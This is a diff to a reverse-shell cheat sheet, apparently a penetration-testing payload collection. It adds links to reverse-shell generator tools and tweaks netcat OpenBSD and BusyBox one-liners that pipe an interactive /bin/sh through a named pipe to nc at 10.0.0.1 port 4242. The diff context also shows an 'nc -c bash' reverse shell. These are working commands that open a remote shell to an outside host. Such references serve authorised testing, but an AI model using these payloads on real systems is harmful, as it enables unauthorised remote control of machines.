@@ -2,6 +2,7 @@
 
 ## Summary
 
+* [Tools](#tools)
 * [Reverse Shell](#reverse-shell)
     * [Awk](#awk)
     * [Automatic Reverse Shell Generator](#revshells)
@@ -38,6 +39,11 @@
     * [Other platforms](#other-platforms)
 * [Spawn TTY Shell](#spawn-tty-shell)
 * [References](#references)
+
+## Tools
+
+- [reverse-shell-generator](https://www.revshells.com/) - Hosted Reverse Shell generator ([source](https://github.com/0dayCTF/reverse-shell-generator)) ![image](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)
+- [revshellgen](https://github.com/t0thkr1s/revshellgen) -  CLI Reverse Shell generator
 
 ## Reverse Shell
 
@@ -202,13 +208,13 @@ nc -c bash 10.0.0.1 4242
 ### Netcat OpenBsd
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```
 
 ### Netcat BusyBox
 
 ```bash
-rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```
 
 ### Ncat
@@ -433,12 +439,6 @@ main() {
   });
 }
 ```
-
-## RevShells
-
-https://www.revshells.com/
-![image](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)
-
 
 ## Meterpreter Shell
 
